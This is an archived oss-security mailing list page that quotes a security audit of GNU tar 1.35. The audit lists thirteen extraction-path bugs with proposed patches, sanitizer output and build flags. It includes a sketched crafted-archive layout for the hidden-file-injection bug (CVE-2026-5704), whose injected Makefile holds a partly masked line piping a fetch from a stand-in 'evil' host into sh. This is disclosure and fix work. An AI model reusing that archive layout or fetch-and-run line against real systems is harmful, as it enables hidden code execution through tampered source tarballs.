@@ -1,0 +1,651 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: GNU tar: listing/extraction desynchronization allows hidden file injection</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="1">[&lt;prev]</a> <a href="3">[next&gt;]</a> <a href="1">[&lt;thread-prev]</a> <a href="3">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;20260412030203.GA27554&#64;openwall.com&gt;
+Date: Sun, 12 Apr 2026 05:02:03 +0200
+From: Solar Designer &lt;solar&#64;...nwall.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Cc: Vahagn Vardanian &lt;vahagn&#64;...rays.io&gt;, Paul Eggert &lt;eggert&#64;...ucla.edu&gt;
+Subject: Re: GNU tar: listing/extraction desynchronization allows hidden file injection
+
+On Sat, Apr 11, 2026 at 10:10:20AM -0700, Alan Coopersmith wrote:
+&gt; <a href="https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00007.html" rel="nofollow">https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00007.html</a> disclosed:
+&gt; &gt;From: 	 Guillermo de Angel
+&gt; &gt;Subject: GNU tar: listing/extraction desynchronization allows hidden file 
+&gt; &gt;injection (tar -t vs tar -x)
+&gt; &gt;Date: 	 Wed, 18 Mar 2026 15:55:41 +0100
+
+&gt; Red Hat appears to have assigned CVE-2026-5704 to this issue.
+&gt; 
+&gt; Paul Eggert provided a patch in
+&gt; <a href="https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00011.html" rel="nofollow">https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00011.html</a>
+&gt; which is also available in
+&gt; <a href="https://cgit.git.savannah.gnu.org/cgit/tar.git/commit/?id=b8d8a61b25588caca4efaf9bdd2e3f1a49da77e3" rel="nofollow">https://cgit.git.savannah.gnu.org/cgit/tar.git/commit/?id=b8d8a61b25588caca4efaf9bdd2e3f1a49da77e3</a>
+&gt; 
+&gt; <a href="https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00012.html" rel="nofollow">https://lists.gnu.org/archive/html/bug-tar/2026-03/msg00012.html</a> points out
+&gt; that a similar report was also included in
+&gt; <a href="https://lists.gnu.org/archive/html/bug-tar/2026-02/msg00022.html" rel="nofollow">https://lists.gnu.org/archive/html/bug-tar/2026-02/msg00022.html</a>
+&gt; along with a number of other bug reports.
+
+This last posting indeed includes "a number of other bug reports", and
+seems to have no replies.  Confusingly, it seems to have been posted as
+a reply to an unrelated message, but that's no reason to ignore it.
+I'll quote it below.  First the summary part:
+
+&gt;   #   Severity  File          Function / Line              Short description
+&gt;   --  --------  -----------   ---------------------------  --------------------------
+&gt;   01  CRITICAL  sparse.c:593  sparse_extract_file          Archive stream desync -&gt; file injection
+&gt;   14  CRITICAL  (same root cause as #01)                   Full RCE chain demo
+&gt;   02  HIGH      sparse.c:803  oldgnu_add_sparse            Overlapping sparse regions -&gt; corruption
+&gt;   03  HIGH      xheader.c     sparse_numbytes/map_decoder  Missing INT_ADD_OVERFLOW
+&gt;   04  LOW       extract.c:1444 create_placeholder_file     FLEXNSIZEOF size_t overflow
+&gt;   05  MEDIUM    extract.c:566 delay_set_stat               Memory leak on reuse path
+&gt;   06  MEDIUM    extract.c:996 apply_nonancestor_delayed..  Shallow xattr_map copy (UAF)
+&gt;   07  MEDIUM    extract.c:985 apply_nonancestor_delayed..  Uninitialized tar_stat_info
+&gt;   08  MEDIUM    extract.c:1898 apply_delayed_link          Uninitialized tar_stat_info
+&gt;   09  MEDIUM    list.c:565    read_header / decode_header  strcmp past magic field
+&gt;   10  MEDIUM    extract.c:1478 create_placeholder_file     Incomplete hash destructor
+&gt;   11  LOW       extract.c:364 check_time                   Signed overflow in time diff
+&gt;   12  LOW       extract.c:953 apply_nonancestor_delayed..  file_name_len=0 underflow
+&gt;   13  LOW       xheader.c:630 decode_record                ptrdiff_t -&gt; int truncation
+
+There's some discrepancy in vulnerability count - the summary lists 14
+and says one has "same root cause" as another, so that's 13 unique, and
+the rest of the message lists them, but the Subject line says 12.  Also
+the message says:
+
+&gt; I am attaching proposed patches and PoC archives for everything below.
+
+but I see no attachments.
+
+Anyway, here's the full thing:
+
+&gt; From: 	Vahagn Vardanian
+&gt; Subject: 	[SECURITY] 12 vulnerabilities in tar 1.35 extraction path, including arbitrary file injection
+&gt; Date: 	Tue, 24 Feb 2026 14:46:53 +0400
+&gt; 
+&gt; Hi,
+&gt; 
+&gt; I found several security bugs in GNU tar 1.35 during a code audit
+&gt; focused on the extraction path.  The most severe one allows a crafted
+&gt; archive to inject arbitrary files onto disk -- files that never appear
+&gt; in "tar -t" output.  A full RCE chain (injecting a Makefile) is
+&gt; trivial to build on top of it.
+&gt; 
+&gt; I am attaching proposed patches and PoC archives for everything below.
+&gt; I would be happy to work with you on getting these merged.  I also
+&gt; prepared Debian quilt patches and regression tests (nine .at files for
+&gt; the GNU Autotest framework) that cover all of the bugs.
+&gt; 
+&gt; The bugs are listed below from most to least severe.
+&gt; 
+&gt; 
+&gt; === BUG #01 / #14  (CRITICAL) ===
+&gt;     Arbitrary file injection via PAX v0.1 sparse archive stream desync
+&gt; 
+&gt; Files:   src/sparse.c:576-596, src/xheader.c
+&gt; Impact:  An attacker can inject files with arbitrary names, modes, and
+&gt;          content that are invisible to "tar -t".  Full RCE is
+&gt;          demonstrated by injecting a Makefile into what looks like a
+&gt;          legitimate source tarball.
+&gt; 
+&gt; Description:
+&gt; 
+&gt; sparse_extract_file() (sparse.c:576) reads archive data blocks
+&gt; according to the sparse map, not according to archive_file_size.
+&gt; If an attacker sets archive_file_size smaller than the sum of all
+&gt; sparse_map[i].numbytes, the extractor reads past the end of the
+&gt; declared archive data into the headers and data of subsequent
+&gt; archive members.  This desynchronizes the archive stream: the
+&gt; next call to read_header() interprets raw data as a tar header.
+&gt; 
+&gt; The attacker controls that data, so they can inject a fully
+&gt; functional tar header for any file they want.  The injected file
+&gt; never appears in "tar -t" output because listing mode does not
+&gt; trigger sparse extraction.
+&gt; 
+&gt; Concrete exploit scenario:
+&gt; 
+&gt;   [PAX ext hdr: GNU.sparse.map=0,512,2048,512; sparse.size=4096]
+&gt;   [ustar hdr: .cache, size=512]        &lt;- archive_file_size=512
+&gt;   [512 bytes of .cache data]           &lt;- region 0 ok
+&gt;   [ustar hdr: .gitignore, size=0]      &lt;- consumed as region 1 data!
+&gt;   [ustar hdr: Makefile, size=80, mode=0755]  &lt;- injected member
+&gt;   [80 bytes: "all:\n\t&#64;...l evil|sh\n"]
+&gt;   [end-of-archive]
+&gt; 
+&gt;   $ tar -tf rce_chain.tar
+&gt;   project-1.0/
+&gt;   project-1.0/README.md
+&gt;   project-1.0/src/main.c
+&gt;   project-1.0/Makefile          &lt;- looks legitimate
+&gt;   $ tar -xf rce_chain.tar -C /tmp/build &amp;&amp; make -C /tmp/build/project-1.0
+&gt;   [*] RCE achieved
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; After tar_sparse_decode_header() returns (sparse.c:593), sum all
+&gt; sparse_map[i].numbytes and call FATAL_ERROR if the total exceeds
+&gt; archive_file_size.  FATAL_ERROR (not ERROR) is required because the
+&gt; caller in extract.c ignores the return value and calls skim_file()
+&gt; with an uninitialized size variable otherwise.
+&gt; 
+&gt;   if (rc)
+&gt;     {
+&gt;       off_t total = 0;
+&gt;       for (i = 0; i &lt; file.stat_info-&gt;sparse_map_avail; i++)
+&gt;         {
+&gt;           if (INT_ADD_OVERFLOW (total, file.stat_info-&gt;sparse_map[i].numbytes))
+&gt;             FATAL_ERROR ((0, 0, _("%s: sparse map total exceeds archive file size"),
+&gt;                          st-&gt;orig_file_name));
+&gt;           total += file.stat_info-&gt;sparse_map[i].numbytes;
+&gt;         }
+&gt;       if (total &gt; file.stat_info-&gt;archive_file_size)
+&gt;         FATAL_ERROR ((0, 0, _("%s: sparse map total exceeds archive file size"),
+&gt;                      st-&gt;orig_file_name));
+&gt;     }
+&gt; 
+&gt; 
+&gt; === BUG #02  (HIGH) ===
+&gt;     Overlapping OLDGNU sparse map entries cause silent data corruption
+&gt; 
+&gt; File:    src/sparse.c:789-803  (oldgnu_add_sparse)
+&gt; Impact:  Silent file corruption.  The extractor lseeks backward and
+&gt;          overwrites already-written data with content from a later
+&gt;          sparse region.
+&gt; 
+&gt; Description:
+&gt; 
+&gt; oldgnu_add_sparse() validates that individual offset and numbytes
+&gt; values are non-negative and that offset+numbytes does not overflow,
+&gt; but it never checks that the new entry does not overlap with the
+&gt; previous one.  An attacker can supply:
+&gt; 
+&gt;   sp[0]: offset=0,   numbytes=512
+&gt;   sp[1]: offset=256, numbytes=512
+&gt; 
+&gt; Region 1 overlaps region 0 at bytes 256-511.  The extractor lseeks
+&gt; to offset 256 and overwrites the first 256 bytes written by region 0.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; Track the end of the previous entry and reject any new entry whose
+&gt; offset falls below it:
+&gt; 
+&gt;   if (file-&gt;stat_info-&gt;sparse_map_avail &gt; 0)
+&gt;     {
+&gt;       struct sp_array *prev =
+&gt;         &amp;file-&gt;stat_info-&gt;sparse_map[file-&gt;stat_info-&gt;sparse_map_avail - 1];
+&gt;       if (INT_ADD_OVERFLOW (prev-&gt;offset, prev-&gt;numbytes)
+&gt;           || sp.offset &lt; prev-&gt;offset + prev-&gt;numbytes)
+&gt;         return add_fail;
+&gt;     }
+&gt; 
+&gt; The same check is also needed in the PAX v0.0 and v0.1 decoders in
+&gt; xheader.c (sparse_numbytes_decoder at line 1426 and sparse_map_decoder
+&gt; at line 1480).
+&gt; 
+&gt; 
+&gt; === BUG #03  (HIGH) ===
+&gt;     Signed integer overflow in PAX v0.0/v0.1 sparse offset+numbytes
+&gt; 
+&gt; Files:   src/xheader.c:1426 (sparse_numbytes_decoder)
+&gt;          src/xheader.c:1480 (sparse_map_decoder)
+&gt; Impact:  Signed 64-bit integer overflow in offset+numbytes arithmetic.
+&gt;          Undefined behavior that can corrupt internal state.
+&gt; 
+&gt; Description:
+&gt; 
+&gt; The PAX v1.0 decoder in sparse.c already checks:
+&gt; 
+&gt;   if (INT_ADD_OVERFLOW (sp.offset, u))
+&gt;     ...
+&gt; 
+&gt; But the PAX v0.0 and v0.1 decoders in xheader.c do not.  A crafted
+&gt; extended header with offset=9223372036854775800 and numbytes=100
+&gt; passes individual range checks but overflows signed off_t when summed.
+&gt; 
+&gt; UBSan output:
+&gt; 
+&gt;   xheader.c:1473: runtime error: signed integer overflow:
+&gt;     9223372036854775800 + 100 cannot be represented in type 'long int'
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; Add the same INT_ADD_OVERFLOW check after assigning numbytes in both
+&gt; sparse_numbytes_decoder() and sparse_map_decoder(), and return early
+&gt; with an error if the check fires.
+&gt; 
+&gt; 
+&gt; === BUG #04  (LOW) ===
+&gt;     FLEXNSIZEOF overflow in create_placeholder_file
+&gt; 
+&gt; File:    src/extract.c:1444
+&gt; Impact:  Theoretical heap buffer overflow if link_name is near SIZE_MAX.
+&gt; 
+&gt; Description:
+&gt; 
+&gt; create_placeholder_file() computes:
+&gt; 
+&gt;   xmalloc (FLEXNSIZEOF (struct delayed_link, target,
+&gt;                          strlen (current_stat_info.link_name) + 1));
+&gt; 
+&gt; If strlen(link_name) is near SIZE_MAX, adding 1 overflows size_t, and
+&gt; FLEXNSIZEOF computes a small allocation size.  The subsequent strcpy
+&gt; writes past the buffer.  PAX extended headers allow arbitrarily long
+&gt; linkpath values, so the attacker controls the length.  In practice
+&gt; this requires the system to have nearly SIZE_MAX bytes of memory
+&gt; available, so it is mostly theoretical.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt;   size_t link_len = strlen (current_stat_info.link_name);
+&gt;   if (SIZE_MAX - sizeof (struct delayed_link) &lt;= link_len)
+&gt;     xalloc_die ();
+&gt; 
+&gt; 
+&gt; === BUG #05  (MEDIUM) ===
+&gt;     Memory leaks in delay_set_stat reuse path
+&gt; 
+&gt; File:    src/extract.c:566-590  (delay_set_stat)
+&gt; Impact:  Unbounded memory leak; a crafted archive with repeated
+&gt;          directory entries and different xattrs can cause OOM.
+&gt; 
+&gt; Description:
+&gt; 
+&gt; When the same directory appears multiple times in an archive,
+&gt; delay_set_stat() reuses the existing hash entry.  But it overwrites
+&gt; cntx_name (line 566), acls_a_ptr (line 571), acls_d_ptr (line 581),
+&gt; and xattr_map (line 590) without freeing the old values first.
+&gt; 
+&gt; Additionally, for NEW entries (the else branch at line 537), cntx_name,
+&gt; acls_a_ptr, and acls_d_ptr are not initialized to NULL.  The memory is
+&gt; allocated with xmalloc, so these fields contain garbage.  If the
+&gt; reuse path then calls free() on them, it frees garbage pointers.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; On the reuse path, add free(data-&gt;cntx_name), free(data-&gt;acls_a_ptr),
+&gt; free(data-&gt;acls_d_ptr), and xattr_map_free()+xattr_map_init() before
+&gt; overwriting.  On the new-entry path, initialize the three pointer
+&gt; fields to NULL and the two length fields to 0.
+&gt; 
+&gt; 
+&gt; === BUG #06  (MEDIUM) ===
+&gt;     Shallow xattr_map copy -- dangling pointer / latent use-after-free
+&gt; 
+&gt; File:    src/extract.c:996  (apply_nonancestor_delayed_set_stat)
+&gt; Impact:  Dangling pointer after the source is freed.  Latent UAF
+&gt;          depending on how set_stat uses the xattr_map.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   struct tar_stat_info sb;
+&gt;   ...
+&gt;   sb.xattr_map = data-&gt;xattr_map;   // line 996: shallow copy
+&gt;   set_stat (data-&gt;file_name, &amp;sb, ...);
+&gt;   // data is freed shortly after, invalidating xattr_map.xattrs
+&gt; 
+&gt; The struct assignment copies the pointer, not the data.  After
+&gt; set_stat returns and data is freed, sb.xattr_map.xattrs is dangling.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; Replace the shallow copy with a deep copy:
+&gt; 
+&gt;   xattr_map_init (&amp;sb.xattr_map);
+&gt;   xattr_map_copy (&amp;sb.xattr_map, &amp;data-&gt;xattr_map);
+&gt;   set_stat (...);
+&gt;   xattr_map_free (&amp;sb.xattr_map);
+&gt; 
+&gt; 
+&gt; === BUG #07  (MEDIUM) ===
+&gt;     Uninitialized struct tar_stat_info on stack
+&gt; 
+&gt; File:    src/extract.c:985  (apply_nonancestor_delayed_set_stat)
+&gt; Impact:  Use of uninitialized memory; detected by MSan.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   struct tar_stat_info sb;       // line 985: uninitialized
+&gt;   sb.stat.st_mode = data-&gt;mode;  // only a few fields are set
+&gt;   ...
+&gt;   set_stat (data-&gt;file_name, &amp;sb, ...);
+&gt; 
+&gt; Fields like stat.st_size, stat.st_dev, dumpdir, sparse_map, etc.
+&gt; retain garbage values from the stack.
+&gt; 
+&gt; MSan output:
+&gt; 
+&gt;   WARNING: MemorySanitizer: use-of-uninitialized-value
+&gt;     #0 in set_stat (extract.c:990)
+&gt;     #1 in apply_nonancestor_delayed_set_stat (extract.c:999)
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt;   memset (&amp;sb, 0, sizeof sb);
+&gt; 
+&gt; 
+&gt; === BUG #08  (MEDIUM) ===
+&gt;     Uninitialized struct tar_stat_info in apply_delayed_link
+&gt; 
+&gt; File:    src/extract.c:1898  (apply_delayed_link)
+&gt; Impact:  Same as Bug #07 -- use of uninitialized memory.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   struct tar_stat_info st1;       // line 1898: uninitialized
+&gt;   st1.stat.st_mode = ds-&gt;mode;
+&gt;   ...
+&gt;   set_stat (source, &amp;st1, ...);
+&gt; 
+&gt; Same pattern as Bug #07 in a different function.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt;   memset (&amp;st1, 0, sizeof st1);
+&gt; 
+&gt; 
+&gt; === BUG #09  (MEDIUM) ===
+&gt;     strcmp overread past the non-NUL-terminated magic field
+&gt; 
+&gt; File:    src/list.c:565, 632  (read_header, decode_header)
+&gt; Impact:  Buffer overread past the 6-byte magic field boundary.
+&gt;          Format misdetection with crafted headers.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   strcmp (h-&gt;magic, TMAGIC)                    // line 565
+&gt;   strcmp (header-&gt;header.magic, TMAGIC)        // line 632
+&gt; 
+&gt; TMAGIC is "ustar\0" (6 bytes including NUL).  The magic field in the
+&gt; header struct is exactly 6 bytes (char magic[6]).  If the field
+&gt; contains "ustar\x01" (no NUL terminator), strcmp reads past byte 5
+&gt; into the adjacent version[2] and uname[32] fields until it finds a NUL.
+&gt; 
+&gt; ASan (with tight heap allocator) reports:
+&gt; 
+&gt;   ERROR: AddressSanitizer: heap-buffer-overflow
+&gt;     READ of size 1 ... in __strcmp_sse42
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt;   memcmp (h-&gt;magic, TMAGIC, sizeof TMAGIC)
+&gt; 
+&gt; 
+&gt; === BUG #10  (MEDIUM) ===
+&gt;     Incomplete destructor for delayed_link_table hash entries
+&gt; 
+&gt; File:    src/extract.c:1478  (create_placeholder_file)
+&gt; Impact:  Memory leak on hash collision/replacement.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   hash_initialize (0, 0, dl_hash, dl_compare, free)
+&gt; 
+&gt; The destructor callback is just free(), which frees the top-level
+&gt; struct delayed_link but not its sub-allocations: the sources linked
+&gt; list, cntx_name, acls_a_ptr, acls_d_ptr, and xattr_map.  When a hash
+&gt; collision causes an old entry to be evicted, these are leaked.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; Write a proper destructor:
+&gt; 
+&gt;   static void
+&gt;   free_delayed_link (void *entry)
+&gt;   {
+&gt;     struct delayed_link *p = entry;
+&gt;     struct string_list *s, *next;
+&gt;     for (s = p-&gt;sources; s; s = next)
+&gt;       {
+&gt;         next = s-&gt;next;
+&gt;         free (s);
+&gt;       }
+&gt;     free (p-&gt;cntx_name);
+&gt;     free (p-&gt;acls_a_ptr);
+&gt;     free (p-&gt;acls_d_ptr);
+&gt;     xattr_map_free (&amp;p-&gt;xattr_map);
+&gt;     free (p);
+&gt;   }
+&gt; 
+&gt; And pass free_delayed_link instead of free to hash_initialize.
+&gt; 
+&gt; 
+&gt; === BUG #11  (LOW) ===
+&gt;     Signed integer overflow in check_time
+&gt; 
+&gt; File:    src/extract.c:364  (check_time)
+&gt; Impact:  Undefined behavior (signed overflow) with base-256 encoded
+&gt;          mtime values near INT64_MAX.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   diff.tv_sec = t.tv_sec - now.tv_sec;    // line 364
+&gt; 
+&gt; If t.tv_sec is a very large positive value (e.g. 2^62 - 1, encoded
+&gt; in base-256 in the mtime field) and now.tv_sec is the current time,
+&gt; the subtraction overflows signed time_t.
+&gt; 
+&gt; UBSan output:
+&gt; 
+&gt;   extract.c:367: runtime error: signed integer overflow:
+&gt;     4611686018427387903 - 1708000000 cannot be represented in type 'long int'
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt;   if (INT_SUBTRACT_OVERFLOW (t.tv_sec, now.tv_sec))
+&gt;     diff.tv_sec = TYPE_MAXIMUM (time_t);
+&gt;   else
+&gt;     diff.tv_sec = t.tv_sec - now.tv_sec;
+&gt; 
+&gt; 
+&gt; === BUG #12  (LOW) ===
+&gt;     Off-by-one when file_name_len is 0
+&gt; 
+&gt; File:    src/extract.c:953  (apply_nonancestor_delayed_set_stat)
+&gt; Impact:  Read at index -1 when data-&gt;file_name_len is 0.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   || (data-&gt;file_name_len &lt; file_name_len
+&gt;       &amp;&amp; file_name[data-&gt;file_name_len]
+&gt;       &amp;&amp; (ISSLASH (file_name[data-&gt;file_name_len])
+&gt;           || ISSLASH (file_name[data-&gt;file_name_len - 1]))
+&gt; 
+&gt; If data-&gt;file_name_len is 0, the _expression_
+&gt; file_name[data-&gt;file_name_len - 1] accesses file_name[(size_t)-1].
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt; Add a guard: data-&gt;file_name_len &gt; 0 &amp;&amp; data-&gt;file_name_len &lt; ...
+&gt; 
+&gt; 
+&gt; === BUG #13  (LOW) ===
+&gt;     Integer truncation in decode_record
+&gt; 
+&gt; File:    src/xheader.c:630  (decode_record)
+&gt; Impact:  Implicit narrowing from ptrdiff_t to int; UBSan
+&gt;          -fsanitize=implicit-conversion fires.
+&gt; 
+&gt; Description:
+&gt; 
+&gt;   int len_len = len_lim - p;    // line 630
+&gt; 
+&gt; len_lim - p is ptrdiff_t.  If the difference exceeds INT_MAX, the
+&gt; implicit conversion to int wraps to a negative value.  The value is
+&gt; only used to format an error message, so the practical impact is
+&gt; limited to a garbled diagnostic, but UBSan rightfully flags it.
+&gt; 
+&gt; Proposed fix:
+&gt; 
+&gt;   int len_len = (int) (len_lim - p &lt; 1000 ? len_lim - p : 1000);
+&gt; 
+&gt; This clamps the value to a reasonable range for the error message.
+&gt; 
+&gt; 
+&gt; === SUMMARY TABLE ===
+&gt; 
+&gt;   #   Severity  File          Function / Line              Short description
+&gt;   --  --------  -----------   ---------------------------  --------------------------
+&gt;   01  CRITICAL  sparse.c:593  sparse_extract_file          Archive stream desync -&gt; file injection
+&gt;   14  CRITICAL  (same root cause as #01)                   Full RCE chain demo
+&gt;   02  HIGH      sparse.c:803  oldgnu_add_sparse            Overlapping sparse regions -&gt; corruption
+&gt;   03  HIGH      xheader.c     sparse_numbytes/map_decoder  Missing INT_ADD_OVERFLOW
+&gt;   04  LOW       extract.c:1444 create_placeholder_file     FLEXNSIZEOF size_t overflow
+&gt;   05  MEDIUM    extract.c:566 delay_set_stat               Memory leak on reuse path
+&gt;   06  MEDIUM    extract.c:996 apply_nonancestor_delayed..  Shallow xattr_map copy (UAF)
+&gt;   07  MEDIUM    extract.c:985 apply_nonancestor_delayed..  Uninitialized tar_stat_info
+&gt;   08  MEDIUM    extract.c:1898 apply_delayed_link          Uninitialized tar_stat_info
+&gt;   09  MEDIUM    list.c:565    read_header / decode_header  strcmp past magic field
+&gt;   10  MEDIUM    extract.c:1478 create_placeholder_file     Incomplete hash destructor
+&gt;   11  LOW       extract.c:364 check_time                   Signed overflow in time diff
+&gt;   12  LOW       extract.c:953 apply_nonancestor_delayed..  file_name_len=0 underflow
+&gt;   13  LOW       xheader.c:630 decode_record                ptrdiff_t -&gt; int truncation
+&gt; 
+&gt; 
+&gt; === REPRODUCTION ===
+&gt; 
+&gt; All bugs were confirmed on tar 1.35 (commit 8e3c8fa17 from
+&gt; <a href="https://git.savannah.gnu.org/cgit/tar.git" rel="nofollow">https://git.savannah.gnu.org/cgit/tar.git</a>).  Bugs #01, #02, and #14
+&gt; are reproducible without sanitizers on any 64-bit Linux system.  The
+&gt; remaining bugs require ASan, UBSan, or MSan to observe.
+&gt; 
+&gt; Build with sanitizers:
+&gt; 
+&gt;   # ASan + UBSan
+&gt;   CC=gcc CFLAGS="-g -O0 -fsanitize=address,undefined" \
+&gt;     LDFLAGS="-fsanitize=address,undefined" ./configure &amp;&amp; make
+&gt; 
+&gt;   # MSan (requires clang)
+&gt;   CC=clang CFLAGS="-g -O0 -fsanitize=memory -fsanitize-memory-track-origins=2" \
+&gt;     LDFLAGS="-fsanitize=memory" ./configure &amp;&amp; make
+&gt; 
+&gt; I can provide the PoC generator scripts and the complete patch if that
+&gt; would be helpful.
+&gt; 
+&gt; Best regards,
+&gt; Vahagn Vardanyan
+&gt; 
+&gt; -- 
+&gt; Vahagn Vardanian
+&gt; Co-founder and Chief Technology Officer,
+&gt; RedRays, Inc
+
+Alexander
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
